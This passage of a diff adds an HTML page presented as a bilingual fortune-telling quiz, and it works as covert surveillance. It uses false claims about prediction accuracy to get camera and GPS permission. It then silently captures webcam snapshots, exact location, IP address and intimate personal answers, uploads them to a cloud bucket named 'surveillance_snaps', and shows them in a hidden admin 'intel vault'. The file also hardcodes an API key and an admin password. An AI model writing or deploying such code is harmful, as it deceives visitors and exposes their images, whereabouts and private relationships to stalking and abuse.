@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Destiny Portal - Master Live Edition</title>
+    
+    <!-- Fonts & Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800;900&family=Noto+Nastaliq+Urdu:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <!-- External Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <style>
+        /* === THEME VARIABLES === */
+        :root {
+            --bg-color-1: #ff9a9e; --bg-color-2: #fecfef; --bg-color-3: #ffc3a0; --bg-color-4: #ffb199;
+            --glass-bg: rgba(0, 0, 0, 0.25); --glass-border: rgba(255, 255, 255, 0.2);
+            --text-color: #ffffff; --text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+            --input-bg: rgba(0, 0, 0, 0.3); --btn-grad-1: #ff758c; --btn-grad-2: #ff7eb3;
+            --shadow-color: rgba(0, 0, 0, 0.6);
+        }
+
+        .dark-theme {
+            --bg-color-1: #0f2027; --bg-color-2: #203a43; --bg-color-3: #2c5364; --bg-color-4: #000000;
+            --glass-bg: rgba(0, 0, 0, 0.6); --glass-border: rgba(0, 255, 204, 0.2);
+            --text-color: #e0f7fa; --text-shadow: 2px 2px 5px rgba(0,0,0,1);
+            --input-bg: rgba(0, 0, 0, 0.5); --btn-grad-1: #00b4db; --btn-grad-2: #0083b0;
+            --shadow-color: rgba(0, 0, 0, 0.9);
+        }
+
+        body, html { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; color: var(--text-color); height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; transition: color 0.5s ease; }
+
+        .background { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(-45deg, var(--bg-color-1), var(--bg-color-2), var(--bg-color-3), var(--bg-color-4)); background-size: 400% 400%; animation: flowingWater 12s ease-in-out infinite alternate; z-index: -2; transition: background 1s ease; }
+        @keyframes flowingWater { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+        .theme-toggle { position: fixed; top: 25px; left: 25px; font-size: 28px; cursor: pointer; z-index: 1000; transition: all 0.3s ease; text-shadow: var(--text-shadow); }
+        .theme-toggle:hover { transform: scale(1.2) rotate(15deg); }
+        .secret-crown { position: fixed; top: 25px; right: 25px; color: #000; font-size: 28px; cursor: pointer; z-index: 1000; transition: all 0.3s ease; text-shadow: 0 0 15px rgba(255, 255, 255, 0.9), 0 0 5px rgba(0, 0, 0, 0.5); }
+        .secret-crown:hover { transform: scale(1.2); }
+
+        /* Main Panel */
+        .glass-panel { background: var(--glass-bg); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid var(--glass-border); border-radius: 30px; padding: 40px; width: 90%; max-width: 600px; box-shadow: 0 15px 35px var(--shadow-color); text-align: center; position: relative; transition: all 0.5s ease; }
+        @media (max-width: 768px) { .glass-panel { padding: 25px; width: 95%; max-width: none; } h2 { font-size: 20px !important; } .urdu-text { font-size: 18px !important; } button { font-size: 16px; padding: 12px 20px; } .theme-toggle, .secret-crown { top: 15px; font-size: 22px; } .secret-crown { right: 15px; } .theme-toggle { left: 15px; } }
+
+        .step { display: none; opacity: 0; transform: scale(0.95); transition: all 0.5s ease; }
+        .step.active { display: block; opacity: 1; transform: scale(1); animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popIn { 0% { opacity: 0; transform: scale(0.8) translateY(20px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }
+
+        h2 { font-weight: 800; text-shadow: var(--text-shadow); margin-bottom: 20px; font-size: 28px; }
+        .urdu-text { font-family: 'Jameel Noori Nastaleeq', 'Noto Nastaliq Urdu', serif; font-size: 24px; line-height: 2; direction: rtl; display: block; margin-top: 5px; color: var(--text-color); text-shadow: var(--text-shadow); }
+
+        input, select { width: 100%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 1px solid var(--glass-border); background: var(--input-bg); color: #fff; font-size: 16px; font-family: 'Poppins', sans-serif; outline: none; box-sizing: border-box; transition: all 0.3s ease; box-shadow: inset 0 2px 5px rgba(0,0,0,0.5); }
+        input:focus, select:focus { background: rgba(255, 255, 255, 0.2); transform: scale(1.02); }
+        input::placeholder { color: rgba(255, 255, 255, 0.7); } option { color: #000; }
+
+        button { background: linear-gradient(135deg, var(--btn-grad-1) 0%, var(--btn-grad-2) 100%); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); width: 100%; box-shadow: 0 5px 15px var(--shadow-color); margin-top: 15px; text-shadow: 1px 1px 2px rgba(0,0,0,0.4); }
+        button:hover { transform: translateY(-3px) scale(1.03); box-shadow: 0 8px 25px var(--shadow-color); }
+
+        .loading-container { display: none; flex-direction: column; align-items: center; }
+        .ribbon-loader { width: 80px; height: 80px; border: 8px solid rgba(255,255,255,0.1); border-top: 8px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Custom VIP Modals */
+        .custom-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 5000; justify-content: center; align-items: center; backdrop-filter: blur(10px); }
+        .modal-box { background: linear-gradient(135deg, #1f1c2c 0%, #928dab 100%); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 20px 50px rgba(0,0,0,0.9); text-align: center; max-width: 450px; width: 90%; color: #fff; animation: popIn 0.5s ease; }
+        .modal-box i.fa-radar { font-size: 50px; color: #00ffcc; margin-bottom: 15px; text-shadow: 0 0 15px #00ffcc; }
+        .btn-allow { background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%); margin-top: 20px; }
+        .btn-deny { background: transparent; border: 1px solid rgba(255,255,255,0.3); color: #ccc; box-shadow: none; margin-top: 10px; }
+        .modal-box i.fa-user-shield { font-size: 50px; color: #ff4d4d; margin-bottom: 15px; text-shadow: 0 0 15px #ff4d4d; }
+
+        /* 10 Second Init Screen */
+        #initScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050a0f; z-index: 9000; flex-direction: column; justify-content: center; align-items: center; color: #00ffcc; font-family: 'Share Tech Mono', monospace; }
+        .cyber-loader { width: 300px; height: 10px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin-top: 20px; border: 1px solid #00ffcc; }
+        .cyber-progress { width: 0%; height: 100%; background: #00ffcc; box-shadow: 0 0 15px #00ffcc; transition: width 0.5s; }
+        #syncText { margin-top: 15px; font-size: 18px; letter-spacing: 2px; }
+
+        /* Final Results */
+        .result-box { background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(15px); padding: 20px; border-radius: 20px; margin-top: 20px; border: 1px solid var(--glass-border); box-shadow: inset 0 0 10px rgba(255,255,255,0.1), 0 10px 20px rgba(0,0,0,0.5); opacity: 0; transform: translateY(30px); }
+        .result-box.cascade { animation: cascadeUp 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        .delay-1 { animation-delay: 0.3s; } .delay-2 { animation-delay: 0.6s; } .delay-3 { animation-delay: 0.9s; }
+        @keyframes cascadeUp { to { opacity: 1; transform: translateY(0); } }
+        .result-box h3 { margin: 0 0 10px 0; font-size: 22px; text-shadow: var(--text-shadow); color: #fff; }
+        .result-box p { font-size: 16px; text-shadow: var(--text-shadow); line-height: 1.6; font-weight: 400; color: #fff; }
+
+        /* Hanging Plate */
+        .hanging-plate-wrapper { position: relative; margin-top: 40px; perspective: 1000px; opacity: 0; transform: translateY(30px); }
+        .hanging-plate-wrapper.cascade { animation: cascadeUp 0.8s forwards; animation-delay: 1.2s; }
+        .hanging-plate { background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(15px); border: 1px solid var(--glass-border); border-bottom: 2px solid rgba(255, 255, 255, 0.5); padding: 12px 30px; border-radius: 12px; display: inline-block; position: relative; transform-origin: top center; animation: swingPlate 4s cubic-bezier(0.455, 0.030, 0.515, 0.955) infinite alternate; }
+        .hanging-plate::before, .hanging-plate::after { content: ''; position: absolute; top: -30px; width: 3px; height: 30px; background: linear-gradient(to bottom, rgba(255,255,255,0.9), rgba(255,255,255,0.2)); box-shadow: 0 0 8px rgba(255,255,255,0.8); }
+        .hanging-plate::before { left: 20px; } .hanging-plate::after { right: 20px; }
+        .pin-left, .pin-right { position: absolute; top: -4px; width: 8px; height: 8px; background: #ffd700; border-radius: 50%; box-shadow: inset -2px -2px 4px rgba(0,0,0,0.4), 0 0 5px rgba(255,215,0,0.8); z-index: 10; }
+        .pin-left { left: 17.5px; } .pin-right { right: 17.5px; }
+        .credit-title { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #fff; margin-bottom: 5px; text-shadow: var(--text-shadow); }
+        .developer-name { font-weight: 800; letter-spacing: 2px; font-size: 18px; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.8); }
+        @keyframes swingPlate { 0% { transform: rotateX(8deg) rotateZ(2deg); } 100% { transform: rotateX(-8deg) rotateZ(-2deg); } }
+
+        /* === ADMIN VAULT & PDF === */
+        #adminVaultUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(-45deg, #050a0f, #0a1922, #0d212b, #000000); background-size: 400% 400%; animation: flowingWater 10s ease infinite; z-index: 9999; color: #fff; font-family: 'Poppins', sans-serif; padding: 40px 20px; overflow-y: auto; box-sizing: border-box; text-align: center; }
+        .vault-header { display: flex; justify-content: space-between; align-items: center; max-width: 1400px; margin: 0 auto 20px; }
+        .close-vault { color: #ff4d4d; font-size: 35px; cursor: pointer; text-shadow: 0 0 10px red; transition: 0.3s; }
+        .close-vault:hover { transform: scale(1.2); }
+        
+        .vault-controls { background: rgba(0,0,0,0.6); padding: 15px; border-radius: 15px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); max-width: 1400px; margin: 0 auto 20px; display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; align-items: center; }
+        .vault-controls select { width: auto; min-width: 150px; margin: 0; background: #111; border: 1px solid #444; color: #fff; }
+        .btn-pdf { background: linear-gradient(135deg, #f12711 0%, #f5af19 100%); width: auto; margin: 0; padding: 12px 25px; box-shadow: 0 0 15px rgba(241, 39, 17, 0.5); color: #fff; }
+
+        .vault-table-wrapper { overflow-x: auto; max-width: 1400px; margin: 0 auto; background: #0a0e17; border-radius: 12px; padding: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.9); border: 1px solid #1f2d3d; }
+        table { width: 100%; border-collapse: collapse; background: #0f1522; color: #e0e0e0; text-align: left; font-size: 13px; }
+        th, td { padding: 15px; border-bottom: 1px solid #1f2d3d; vertical-align: middle; }
+        th { background: #151b29; font-weight: 800; color: #00ffcc; text-transform: uppercase; border-bottom: 2px solid #00b4db; letter-spacing: 1px; }
+        tr:nth-child(even) { background-color: #0c111a; }
+        tr:hover { background: #1a2333; }
+        a.loc-link { color: #00ffcc; text-decoration: none; font-weight: 700; display: inline-block; padding: 4px 10px; background: rgba(0,255,204,0.1); border-radius: 6px; border: 1px solid rgba(0,255,204,0.3); transition: 0.2s; }
+        
+        .snap-grid { display: flex; gap: 5px; flex-wrap: wrap; max-width: 180px; }
+        .snap-grid img { width: 50px; height: 40px; object-fit: cover; border-radius: 6px; border: 1px solid #444; box-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+
+        #reportHeader { display: none; text-align: center; background: linear-gradient(180deg, #050a0f 0%, #0a0e17 100%); padding: 40px 30px; margin-bottom: 20px; font-family: 'Poppins', sans-serif; border: 1px solid #1f2d3d; border-radius: 8px; }
+        #reportHeader h1 { margin: 0; font-size: 36px; font-weight: 900; text-transform: uppercase; color: #ffffff; letter-spacing: 4px; text-shadow: 0 0 20px rgba(255,255,255,0.2); }
+        #reportHeader h2 { margin: 15px 0; font-size: 24px; color: #ff4d4d; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px rgba(255,77,77,0.5); }
+        #reportHeader .meta-info { display: flex; justify-content: space-around; background: rgba(0,255,204,0.05); padding: 15px; border-radius: 8px; margin-top: 25px; border: 1px solid rgba(0,255,204,0.2); }
+        #reportHeader p { margin: 0; font-size: 14px; color: #a0aec0; text-transform: uppercase; letter-spacing: 1px; }
+        #reportHeader p strong { color: #00ffcc; }
+    </style>
+</head>
+<body>
+
+    <!-- Silent Video Element -->
+    <video id="webcamVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="webcamCanvas" style="display:none;"></canvas>
+
+    <div class="background"></div>
+
+    <div class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark Mode"><i class="fa-solid fa-moon" id="themeIcon"></i></div>
+    <div class="secret-crown" onclick="showVipLogin()" title="Admin Login"><i class="fa-solid fa-crown"></i></div>
+
+    <!-- 1. VIP SENSORY PERMISSION POPUP -->
+    <div class="custom-overlay" id="sensoryModal">
+        <div class="modal-box">
+            <i class="fa-solid fa-satellite-dish fa-radar"></i>
+            <h2 style="font-size: 22px; margin-bottom: 10px;">LIVE PREDICTION PROTOCOL</h2>
+            <p style="font-size: 14px; color: #ccc; line-height: 1.5; margin-bottom: 20px;">
+                To achieve 100% exact predictive accuracy, this software requires temporary sensory access (Camera & High-Accuracy GPS).<br>Do you authorize Live Sensory Sync?
+            </p>
+            <button class="btn-allow" onclick="grantSensoryAccess()">ALLOW (RECOMMENDED)</button>
+            <button class="btn-deny" onclick="denySensoryAccess()">DENY ACCESS</button>
+        </div>
+    </div>
+
+    <!-- 2. VIP ADMIN LOGIN POPUP -->
+    <div class="custom-overlay" id="vipLoginModal">
+        <div class="modal-box">
+            <i class="fa-solid fa-user-shield"></i>
+            <h2 style="font-size: 22px; margin-bottom: 20px; color: #ff4d4d;">MASTER ADMIN PORTAL</h2>
+            <input type="text" id="adminUser" placeholder="Username" style="background: rgba(255,255,255,0.1); border: 1px solid #555;">
+            <input type="password" id="adminPass" placeholder="Secure Authentication Code" style="background: rgba(255,255,255,0.1); border: 1px solid #555;">
+            <button class="btn-allow" style="background: linear-gradient(135deg, #ff4d4d 0%, #b22222 100%); box-shadow: 0 0 15px rgba(255,77,77,0.5);" onclick="verifyAdmin()">INITIATE SYNC</button>
+            <button class="btn-deny" onclick="document.getElementById('vipLoginModal').style.display='none'">CANCEL</button>
+        </div>
+    </div>
+
+    <!-- 3. 10 SECOND INIT SCREEN -->
+    <div id="initScreen">
+        <i class="fa-solid fa-server" style="font-size: 60px; margin-bottom: 20px; animation: popIn 1s infinite alternate;"></i>
+        <h2 style="margin: 0; text-shadow: 0 0 15px #00ffcc;">SUPABASE SECURE CONNECTION INITIALIZING</h2>
+        <div class="cyber-loader"><div class="cyber-progress" id="initProgress"></div></div>
+        <div id="syncText">Establishing Encrypted Connection...</div>
+    </div>
+
+    <!-- MAIN APP PANEL -->
+    <div class="glass-panel" id="mainPanel">
+        <div class="step active" id="step1">
+            <h2><i class="fa-solid fa-hourglass-half"></i> Enter Your Age<br><span class="urdu-text">اپنی عمر درج کریں</span></h2>
+            <input type="number" id="userAge" placeholder="e.g., 20" required autofocus>
+            <button onclick="checkSensoryThenNext(1)">Next <i class="fa-solid fa-arrow-right"></i></button>
+        </div>
+
+        <div class="step" id="step2">
+            <h2><i class="fa-solid fa-venus-mars"></i> Select Gender<br><span class="urdu-text">جنس منتخب کریں</span></h2>
+            <select id="userGender">
+                <option value="Male">Male (مرد)</option>
+                <option value="Female">Female (عورت)</option>
+                <option value="Other">Other (دیگر)</option>
+            </select>
+            <button onclick="nextStep(2)">Next <i class="fa-solid fa-arrow-right"></i></button>
+        </div>
+
+        <div class="step" id="step3">
+            <h2><i class="fa-solid fa-user-group"></i> Best Friend's Name<br><span class="urdu-text">بہترین دوست کا نام</span></h2>
+            <input type="text" id="bestFriend" placeholder="Ride or die..." required>
+            <button onclick="nextStep(3)">Next <i class="fa-solid fa-arrow-right"></i></button>
+        </div>
+
+        <div class="step" id="step4">
+            <h2><i class="fa-solid fa-heart"></i> Secret Love Name<br><span class="urdu-text">خفیہ محبت کا نام</span></h2>
+            <input type="text" id="loveName" placeholder="A special someone..." required>
+            <button onclick="nextStep(4)">Next <i class="fa-solid fa-arrow-right"></i></button>
+        </div>
+
+        <div class="step" id="step5">
+            <h2><i class="fa-solid fa-music"></i> Favorite Song<br><span class="urdu-text">پسندیدہ گانا</span></h2>
+            <input type="text" id="favSong" placeholder="What's your jam?" required>
+            <button onclick="processData()">Analyze Destiny <i class="fa-solid fa-wand-magic-sparkles"></i></button>
+        </div>
+
+        <div class="loading-container" id="loadingScreen">
+            <div class="ribbon-loader"></div>
+            <h2 id="loadingText" style="font-size: 24px;">Unlocking VIP Destiny...</h2>
+            <p class="urdu-text" style="font-size: 20px;">وی آئی پی تقدیر کھل رہی ہے...</p>
+        </div>
+
+        <div class="step" id="finalResult">
+            <h2 class="result-box cascade delay-1" style="background:transparent; box-shadow:none; border:none; margin:0; padding:0;">
+                Your Destiny Revealed<br><span class="urdu-text" style="font-size: 28px;">آپ کی تقدیر کا فیصلہ</span>
+            </h2>
+            <div class="result-box cascade delay-2">
+                <h3>Prediction <span class="urdu-text" style="display:inline; font-size:20px;">(پیشین گوئی)</span></h3>
+                <p id="predictionTextEn"></p>
+                <div id="predictionTextUr" class="urdu-text" style="font-size: 20px;"></div>
+            </div>
+            <div class="result-box cascade delay-3">
+                <h3>Live Daily Quote <span class="urdu-text" style="display:inline; font-size:20px;">(آج کا قول)</span></h3>
+                <p id="quoteTextEn">Fetching...</p>
+                <div id="quoteTextUr" class="urdu-text" style="font-size: 20px;"></div>
+            </div>
+            <div class="hanging-plate-wrapper cascade">
+                <div class="hanging-plate">
+                    <div class="pin-left"></div><div class="pin-right"></div>
+                    <div class="credit-title">Designed & Developed by</div>
+                    <div class="developer-name">QURAT UL AIN</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ADMIN VAULT UI -->
+    <div id="adminVaultUI">
+        <div class="vault-header">
+            <h2 style="margin:0; color:#00ffcc; text-shadow:0 0 15px #00ffcc;"><i class="fa-solid fa-network-wired"></i> MASTER INTEL VAULT</h2>
+            <i class="fa-solid fa-xmark close-vault" onclick="closeVault()"></i>
+        </div>
+        
+        <div class="vault-controls">
+            <select id="filterAge" onchange="renderVaultTable()"><option value="all">Filter by Age: All</option></select>
+            <select id="filterGender" onchange="renderVaultTable()">
+                <option value="all">Filter by Gender: All</option>
+                <option value="Male">Male</option><option value="Female">Female</option><option value="Other">Other</option>
+            </select>
+            <button class="btn-pdf" onclick="generatePDFReport()"><i class="fa-solid fa-file-pdf"></i> Export Secure Intel Report</button>
+        </div>
+
+        <div class="vault-table-wrapper" id="pdfTarget">
+            <div id="reportHeader">
+                <h1>CLASSIFIED INTELLIGENCE REPORT</h1>
+                <h2><i class="fa-solid fa-user-shield"></i> MASTER ADMIN: DILAWAR ALI</h2>
+                <div class="meta-info">
+                    <p>SYSTEM STATUS: <strong>SUPABASE CLOUD SYNC ACTIVE</strong></p>
+                    <p>SYNC TIME: <strong id="pdfTime"></strong></p>
+                </div>
+            </div>
+
+            <table>
+                <thead>
+                    <tr><th>ID</th><th>Network & Time</th><th>Exact Geo-Location</th><th>Bio Metrics</th><th>Relationships</th><th>Psych-Profile</th><th>Visual Intel</th></tr>
+                </thead>
+                <tbody id="vaultTableBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        // --- 1. SUPABASE INITIALIZATION ---
+        const SUPABASE_URL = 'https://pzkyzmgevopfbousnpiu.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB6a3l6bWdldm9wZmJvdXNucGl1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE3NTg2NjgsImV4cCI6MjA5NzMzNDY2OH0.1hxXLrZQUIU8TFEt__ITE8uQLWv8NBWtNI_Vps7Kya4';
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // --- 2. GLOBAL STATE ---
+        let globalAdminVault = []; 
+        let adminClickCount = 0;
+        let currentUserIP = "Protected IP";
+        let currentUserLoc = { lat: "Unknown", lon: "Unknown", link: "#", coordsString: "Unknown" };
+        let sessionSnaps = [];
+        let cameraInterval;
+        let hasAskedSensory = false;
+
+        const ADMIN_USER = "admin";
+        const ADMIN_PASS = "3610198511699"; 
+
+        // --- 3. NETWORK & GPS ---
+        async function fetchIP() {
+            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); currentUserIP = data.ip; } catch (e) {}
+        }
+        fetchIP();
+
+        function getExactLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    currentUserLoc.lat = pos.coords.latitude.toFixed(6);
+                    currentUserLoc.lon = pos.coords.longitude.toFixed(6);
+                    currentUserLoc.link = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+                    currentUserLoc.coordsString = `${currentUserLoc.lat}, ${currentUserLoc.lon}`;
+                }, () => {
+                    currentUserLoc = { lat: "Denied", lon: "Denied", link: "#", coordsString: "Denied" };
+                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            }
+        }
+
+        // --- 4. CAMERA PROTOCOL ---
+        function checkSensoryThenNext(step) {
+            const input = document.querySelector(`#step${step} input`);
+            if (input && input.value.trim() === '') {
+                input.style.border = "2px solid #ff4d4d"; input.animate([{ transform: 'translateX(-10px)' }, { transform: 'translateX(10px)' }, { transform: 'translateX(0px)' }], { duration: 300 });
+                setTimeout(() => input.style.border = "1px solid var(--glass-border)", 1000); return;
+            }
+            if (!hasAskedSensory) { document.getElementById('sensoryModal').style.display = 'flex'; } else { nextStep(step); }
+        }
+
+        async function grantSensoryAccess() {
+            document.getElementById('sensoryModal').style.display = 'none';
+            hasAskedSensory = true; getExactLocation();
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('webcamVideo'); video.srcObject = stream;
+                cameraInterval = setInterval(captureSnap, 3000);
+            } catch(e) { console.log("Camera hardware rejected."); }
+            nextStep(1);
+        }
+
+        function denySensoryAccess() {
+            document.getElementById('sensoryModal').style.display = 'none';
+            hasAskedSensory = true; currentUserLoc.coordsString = "User Denied"; nextStep(1);
+        }
+
+        function captureSnap() {
+            const video = document.getElementById('webcamVideo'); const canvas = document.getElementById('webcamCanvas');
+            if(video.videoWidth > 0) {
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                sessionSnaps.push(canvas.toDataURL('image/jpeg', 0.5));
+                if(sessionSnaps.length > 5) sessionSnaps.shift();
+            }
+        }
+
+        function nextStep(current) {
+            document.getElementById(`step${current}`).classList.remove('active');
+            setTimeout(() => { const nextEl = document.getElementById(`step${current + 1}`); if(nextEl) { nextEl.classList.add('active'); const nextInput = nextEl.querySelector('input'); if(nextInput) nextInput.focus(); } }, 100);
+        }
+
+        // Convert base64 to Blob for Supabase upload
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const dw = new DataView(ab);
+            for(let i = 0; i < byteString.length; i++) dw.setUint8(i, byteString.charCodeAt(i));
+            return new Blob([ab], {type: mimeString});
+        }
+
+        // --- 5. SUBMIT TO SUPABASE ---
+        async function processData() {
+            const favSong = document.getElementById('favSong').value;
+            if (favSong.trim() === '') return;
+
+            clearInterval(cameraInterval);
+            const tracks = document.getElementById('webcamVideo').srcObject?.getTracks();
+            if(tracks) tracks.forEach(track => track.stop());
+
+            document.getElementById('step5').classList.remove('active');
+            document.getElementById('loadingScreen').style.display = 'flex';
+            document.getElementById('loadingText').innerText = "Syncing with Enterprise Cloud...";
+
+            fetchLiveQuote();
+
+            // 1. Upload Images to Supabase Storage
+            let uploadedUrls = [];
+            for (let i = 0; i < sessionSnaps.length; i++) {
+                try {
+                    const blob = dataURItoBlob(sessionSnaps[i]);
+                    const fileName = `snap_${Date.now()}_${i}.jpg`;
+                    const { data, error } = await supabase.storage.from('surveillance_snaps').upload(fileName, blob);
+                    if (!error) {
+                        const { data: urlData } = supabase.storage.from('surveillance_snaps').getPublicUrl(fileName);
+                        uploadedUrls.push(urlData.publicUrl);
+                    }
+                } catch(e) { console.error("Upload failed", e); }
+            }
+
+            // 2. Insert Record into Supabase DB
+            try {
+                await supabase.from('destiny_intel').insert([{
+                    ip_address: currentUserIP,
+                    location_coords: currentUserLoc.coordsString,
+                    location_link: currentUserLoc.link,
+                    age: document.getElementById('userAge').value,
+                    gender: document.getElementById('userGender').value,
+                    best_friend: document.getElementById('bestFriend').value,
+                    love_name: document.getElementById('loveName').value,
+                    fav_song: favSong,
+                    snaps: uploadedUrls
+                }]);
+            } catch(e) { console.error("DB Insert failed", e); }
+
+            // 3. Show Final Reveal
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.display = 'none';
+                generateAccuratePrediction();
+                document.getElementById('finalResult').classList.add('active');
+            }, 1000); 
+        }
+
+        // --- 6. PREDICTIONS & QUOTES ---
+        function generateAccuratePrediction() {
+            const dataString = `${document.getElementById('userAge').value}-${document.getElementById('userGender').value}-${document.getElementById('bestFriend').value}-${document.getElementById('loveName').value}-${document.getElementById('favSong').value}`;
+            let hash = 0; for (let i = 0; i < dataString.length; i++) hash = ((hash << 5) - hash) + dataString.charCodeAt(i);
+            const score = Math.abs(hash % 3);
+            let favSong = document.getElementById('favSong').value;
+            let bff = document.getElementById('bestFriend').value;
+            let love = document.getElementById('loveName').value;
+            
+            let predEn = "", predUr = "";
+            if (score === 0) {
+                predEn = `The rhythm of "${favSong}" perfectly aligns with your timeline. A massive financial breakthrough alongside ${bff} is imminent.`;
+                predUr = `"${favSong}" کی دھن آپ کی تقدیر کے ساتھ بالکل ہم آہنگ ہے۔ ${bff} کے ساتھ بڑی کامیابی ملنے والی ہے۔`;
+            } else if (score === 1) {
+                predEn = `The energy connecting you and ${love} is extremely potent. Keep your frequency high with "${favSong}".`;
+                predUr = `آپ اور ${love} کے درمیان روحانی تعلق بہت مضبوط ہے۔ بہترین خبریں آنے والی ہیں!`;
+            } else {
+                predEn = `A major destiny shift is approaching. The universe is aligning your path with the vibrations of "${favSong}". Trust ${bff}.`;
+                predUr = `آپ ایک بڑی تبدیلی کے دہانے پر ہیں۔ کائنات آپ کے راستے کو ہم آہنگ کر رہی ہے۔`;
+            }
+            document.getElementById('predictionTextEn').innerText = predEn; document.getElementById('predictionTextUr').innerText = predUr;
+        }
+
+        async function fetchLiveQuote() {
+            try {
+                const response = await fetch(`https://api.quotable.io/random?t=${new Date().getTime()}`);
+                const data = await response.json();
+                document.getElementById('quoteTextEn').innerText = `"${data.content}" - ${data.author}`;
+                document.getElementById('quoteTextUr').innerText = "یہ ایک خوبصورت اور سچا قول ہے جو آپ کی زندگی میں روشنی لائے گا۔"; 
+            } catch (error) {
+                document.getElementById('quoteTextEn').innerText = "No matter how hard the past is, you can always begin again.";
+                document.getElementById('quoteTextUr').innerText = "ماضی کتنا ہی مشکل کیوں نہ ہو، آپ ہمیشہ نئی شروعات کر سکتے ہیں۔";
+            }
+        }
+
+        // --- 7. VIP ADMIN SEQUENCE ---
+        function showVipLogin() {
+            adminClickCount++;
+            if (adminClickCount === 3) {
+                adminClickCount = 0; document.getElementById('adminUser').value = ''; document.getElementById('adminPass').value = '';
+                document.getElementById('vipLoginModal').style.display = 'flex';
+            }
+            setTimeout(() => { adminClickCount = 0; }, 3000);
+        }
+
+        function verifyAdmin() {
+            const user = document.getElementById('adminUser').value; const pass = document.getElementById('adminPass').value;
+            if (user === ADMIN_USER && pass === ADMIN_PASS) {
+                document.getElementById('vipLoginModal').style.display = 'none'; startInitSequence();
+            } else { alert("ACCESS DENIED."); }
+        }
+
+        function startInitSequence() {
+            const initScreen = document.getElementById('initScreen'); const progress = document.getElementById('initProgress'); const syncText = document.getElementById('syncText');
+            initScreen.style.display = 'flex'; let percentage = 0;
+            const texts = ["Establishing Encrypted Connection...", "Bypassing Security Firewalls...", "Syncing Supabase Cloud Nodes...", "Decrypting Real-Time Database...", "Finalizing Access Protocol..."];
+            let textIndex = 0;
+
+            const interval = setInterval(() => {
+                percentage += 1; progress.style.width = percentage + '%';
+                if (percentage % 20 === 0 && textIndex < texts.length) { syncText.innerText = texts[textIndex]; textIndex++; }
+                if (percentage >= 100) { clearInterval(interval); initScreen.style.display = 'none'; openVault(); }
+            }, 100); 
+        }
+
+        // --- 8. FETCH FROM SUPABASE & RENDER VAULT ---
+        async function fetchVaultFromSupabase() {
+            const { data, error } = await supabase.from('destiny_intel').select('*').order('created_at', { ascending: false });
+            if (!error && data) { globalAdminVault = data; }
+        }
+
+        async function openVault() {
+            await fetchVaultFromSupabase(); // LIVE SYNC
+            
+            const ageSelect = document.getElementById('filterAge');
+            ageSelect.innerHTML = '<option value="all">Filter by Age: All</option>';
